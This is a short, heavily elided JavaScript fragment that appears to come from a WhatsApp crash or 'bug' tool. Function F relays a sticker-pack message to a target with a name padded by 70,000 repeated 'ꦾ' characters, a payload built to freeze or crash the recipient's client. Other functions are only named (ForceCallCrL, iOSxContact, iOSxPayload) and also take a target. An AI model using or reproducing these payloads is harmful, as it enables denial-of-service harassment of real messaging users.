...
async function F(sock, target) {
    await sock.relayMessage(target, {
        stickerPackMessage: {
            ...
            name: "Xrelly - StickerPack" + "ꦾ".repeat(70000),
            publisher: "Xrelly Mp4" + "",
            stickers: [
                {
...
async function ForceCallCrL(target) {
...
async function iOSxContact(target) {
...
async function iOSxPayload(target) {
    let buggerss = "-";
    const payload = {
